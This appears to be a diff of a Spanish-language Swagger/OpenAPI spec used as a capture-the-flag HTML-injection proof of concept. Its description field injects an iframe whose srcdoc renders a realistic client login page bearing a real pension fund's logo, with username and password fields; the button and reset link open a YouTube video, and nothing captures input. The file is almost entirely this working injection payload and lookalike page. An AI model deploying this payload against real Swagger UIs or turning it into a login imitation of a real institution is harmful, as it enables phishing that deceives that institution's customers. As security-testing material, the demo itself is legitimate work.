@@ -3,123 +3,114 @@ info:
   title: 🔐 CTF Swagger HTML Injection
   version: "3.0"
   description: |
-    <h2 style="color:#b30000">CTF – Login Renderizado vía IFRAME</h2>
+    <h2 style="color:#b30000">CTF – Login renderizado con IFRAME</h2>
 
     <iframe
-      style="width:100%;height:520px;border:0;box-shadow:0 10px 30px rgba(0,0,0,.3)"
-      srcdoc='
+      style="width:100%;height:540px;border:none;box-shadow:0 10px 30px rgba(0,0,0,.3)"
+      srcdoc="
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
+<meta charset='UTF-8'>
 <style>
-  body {
-    margin:0;
-    background:#f2f4f7;
-    font-family: Arial, sans-serif;
-  }
-  .login-box {
-    width:380px;
-    margin:40px auto;
-    background:white;
-    padding:30px;
-    border-radius:12px;
-    box-shadow:0 10px 25px rgba(0,0,0,.2);
-  }
-  .logo {
-    text-align:center;
-    margin-bottom:20px;
-  }
-  .logo img {
-    max-width:220px;
-  }
-  h2 {
-    text-align:center;
-    color:#003865;
-    margin-bottom:20px;
-  }
-  input {
-    width:100%;
-    padding:12px;
-    margin-bottom:14px;
-    border-radius:6px;
-    border:1px solid #bbb;
-    font-size:15px;
-  }
-  button {
-    width:100%;
-    padding:12px;
-    background:#003865;
-    color:white;
-    border:none;
-    border-radius:6px;
-    font-size:16px;
-    cursor:pointer;
-  }
-  button:hover {
-    background:#002a4d;
-  }
-  .links {
-    margin-top:15px;
-    text-align:center;
-    font-size:13px;
-  }
-  .links a {
-    color:#003865;
-    text-decoration:none;
-  }
-  .ctf {
-    margin-top:18px;
-    font-size:11px;
-    text-align:center;
-    color:#888;
-  }
+body {
+  margin:0;
+  background:#f2f4f7;
+  font-family: Arial, sans-serif;
+}
+.login-box {
+  width:380px;
+  margin:40px auto;
+  background:white;
+  padding:30px;
+  border-radius:12px;
+  box-shadow:0 10px 25px rgba(0,0,0,.2);
+}
+.logo {
+  text-align:center;
+  margin-bottom:20px;
+}
+.logo img {
+  max-width:220px;
+}
+h2 {
+  text-align:center;
+  color:#003865;
+  margin-bottom:20px;
+}
+input {
+  width:100%;
+  padding:12px;
+  margin-bottom:14px;
+  border-radius:6px;
+  border:1px solid #bbb;
+  font-size:15px;
+}
+button {
+  width:100%;
+  padding:12px;
+  background:#003865;
+  color:white;
+  border:none;
+  border-radius:6px;
+  font-size:16px;
+  cursor:pointer;
+}
+button:hover {
+  background:#002a4d;
+}
+.links {
+  margin-top:15px;
+  text-align:center;
+  font-size:13px;
+}
+.links a {
+  color:#003865;
+  text-decoration:none;
+}
+.ctf {
+  margin-top:18px;
+  font-size:11px;
+  text-align:center;
+  color:#888;
+}
 </style>
 </head>
 
 <body>
-  <div class="login-box">
-    <div class="logo">
-      <img src="https://www.afpsiembra.com/media/54pdmbwv/main-logo.png">
+  <div class='login-box'>
+    <div class='logo'>
+      <img src='https://www.afpsiembra.com/media/54pdmbwv/main-logo.png'>
     </div>
 
     <h2>Acceso a Clientes</h2>
 
-    <input placeholder="Usuario o documento">
-    <input type="password" placeholder="Contraseña">
+    <input placeholder='Usuario o documento'>
+    <input type='password' placeholder='Contraseña'>
 
-    <button onclick="
-      window.open(
-        &quot;https://youtu.be/rscOXVuaCGw&quot;,
-        &quot;ctfPopup&quot;,
-        &quot;width=900,height=650&quot;
-      )">
+    <button onclick=&quot;window.open('https://youtu.be/rscOXVuaCGw','ctfPopup','width=900,height=650')&quot;>
       Ingresar
     </button>
 
-    <div class="links">
-      <a href="https://youtu.be/rscOXVuaCGw" target="_blank">
+    <div class='links'>
+      <a href='https://youtu.be/rscOXVuaCGw' target='_blank'>
         ¿Olvidaste tu contraseña?
       </a>
     </div>
 
-    <div class="ctf">
+    <div class='ctf'>
       ⚠️ DEMO CTF – HTML Injection / XSS PoC
     </div>
   </div>
 </body>
 </html>
-'>
+">
     </iframe>
 
 paths:
   /iframe-login:
     get:
       summary: Login realista renderizado con iframe
-      description: |
-        Este endpoint demuestra cómo HTML Injection
-        permite renderizar interfaces completas
-        usando iframe/srcdoc en Swagger UI vulnerable.
       responses:
         '200':
           description: iframe injection successful
